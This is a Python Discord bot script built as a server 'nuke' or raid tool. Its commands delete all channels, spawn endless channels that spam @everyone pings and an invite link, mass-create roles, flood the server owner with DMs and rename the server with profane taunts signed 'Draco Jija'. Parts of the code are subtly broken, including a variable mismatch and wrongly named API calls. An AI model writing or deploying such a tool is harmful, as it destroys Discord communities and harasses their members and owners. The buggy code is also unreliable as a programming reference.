#imports
import discord 
from discord.ext import commands

client = commands.Bot(command_prefix="&",
              intents=discord.Intents.all())#client


#events
@client.event
async def on_ready():
  print("Logged in as {}".format(client.user))

#main command
@client.command()
async def nuke(ctx):
  await ctx.guild.edit(name="Wizzed by Draco Jija")
  try:                             
    for channels in ctx.guild.channels:
     await channel.delete()
    print("deleted {}".format(channels))
  except:
    print("can't delete {}".format(channels))

  while True:
    await ctx.guild.Create_text_channel("Fucked by Draco Jija")

#pings
@client.event 
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone @here Srvr Fucked By Draco Jija Join Mag Residence https://discord.gg/JaHnQNA2he")





@client.command() 
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_role("Draco Jija On fire v17")

@client.command()
async def ownerspam(ctx):
  owner = ctx.guild.owner
  while True:
    await owner.send("Draco Jija On fire Draco and Mag Se dar lode")

@client.command()
async def guildname(ctx, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name="Draco is here to rule this shit")

# Making the Client run 
client.run("Bot_Token")
